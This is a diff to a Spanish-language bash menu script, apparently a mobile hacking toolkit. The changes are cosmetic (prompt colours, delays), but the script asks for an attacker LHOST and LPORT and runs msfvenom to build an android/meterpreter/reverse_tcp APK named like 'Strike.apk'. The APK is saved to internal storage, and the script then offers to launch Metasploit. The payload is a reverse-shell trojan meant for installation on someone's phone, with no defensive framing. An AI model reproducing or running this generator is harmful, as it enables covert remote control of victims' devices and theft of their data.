@@ -76,25 +76,31 @@ case $opcion in
                 sleep 1.5
 
 	    echo -e ${verde}""
-            read -p "Digite tu LHOST: " LHOST
-            sleep 1
+            echo -e -n ${cyan}"Digite tu LHOST:${verde} " 
+            read -r LHOST
+            sleep 2
 	    echo ""
-	    echo -e ${magenta}"Ejemplo: 4444"${verde}
-            read -p "Digite tu LPORT: " LPORT
-            sleep 1
+	    echo -e ${magenta}"Ejemplo${cyan}:${magenta} 4444"
+            echo -e -n ${cyan}"Digite tu LPORT:${verde} " 
+            read -r LPORT
+            sleep 2
 	    echo ""
-	    echo -e ${magenta}"Ejemplo: Strike.apk"${verde}
-	    read -p "Nombre del apk: " apk
-	    sleep 1
+	    echo -e ${magenta}"Ejemplo${cyan}:${magenta} Strike.apk"
+	    echo -e -n ${cyan}"Nombre del apk:${verde} " 
+            read -r apk
+	    sleep 2
+            echo ""
+            echo -e ${verde}"[+]${blanco} Generando el Payload...."
+            sleep 3
 	    echo ""
 msfvenom -p android/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT"  R > /sdcard/"$apk"
             sleep 1
 	    echo ""
-	    echo -e ${verde}"[✓]Payload Generado"
-	    sleep 1.5
+	    echo -e ${verde}"[+]${blanco}Payload Generado"
+	    sleep 3
 	    echo ""
-	    echo -e ${verde}"[✓]Guardado en la memoria interna"
-	    sleep 1.5
+	    echo -e ${verde}"[+]${blanco}Guardado en la memoria interna"
+	    sleep 3
 	    echo ""
 echo -e ${blanco}" ¿Ejecuto Metasploit?"
 echo -e ${verde}"
